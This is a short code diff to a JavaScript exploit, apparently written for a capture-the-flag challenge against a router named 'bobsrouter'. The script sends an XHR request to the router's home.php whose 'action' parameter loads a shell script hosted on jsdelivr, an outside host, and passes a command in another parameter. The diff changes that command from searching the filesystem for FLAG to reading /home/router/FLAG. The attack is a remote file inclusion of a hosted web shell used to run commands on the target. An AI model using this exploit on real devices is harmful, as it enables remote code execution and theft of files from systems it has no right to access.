@@ -33,7 +33,8 @@ xhr.onreadystatechange = function() {
 		}
 
 		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.29/shell";
-		const cmd = "find / -name FLAG";
+		//const cmd = "find / -name FLAG";
+		const cmd = "cat /home/router/FLAG";
 
 		xhr2.open("GET", ROUTER + "/home.php?action=" + encodeURIComponent(SHELL) + "&x=" + encodeURIComponent(cmd) + "&PHPSESSID=" + sessionId, true);
 		xhr2.send('');
